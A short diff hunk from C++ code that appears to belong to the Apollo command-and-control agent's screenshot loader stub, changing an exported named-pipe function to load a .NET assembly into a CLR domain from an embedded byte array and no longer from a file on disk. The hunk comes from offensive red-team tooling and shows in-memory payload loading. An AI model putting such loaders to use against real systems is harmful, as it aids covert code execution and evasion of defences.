@@ -69,7 +69,7 @@ extern "C" __declspec(dllexport) void __cdecl InitializeNamedPipeServer(LPVOID l
         fwprintf(fp, L"Wide string version: %s\n", pipeName);
 #endif // DEBUG
         DWORD bytes = 0;
-        std::vector<uint8_t> vec = read_vector_from_disk("C:\\Users\\Reznok\\source\\repos\\Apollo\\Payload_Type\\Apollo\\agent_code\\Stubs\\ScreenshotLoaderStub\\bin\\x64\\Release\\ScreenshotRunner.exe");
+        std::vector<uint8_t> vec(std::begin(rawData), std::end(rawData));
         clr::ClrDomain dom;
         auto res = dom.load(vec);
 
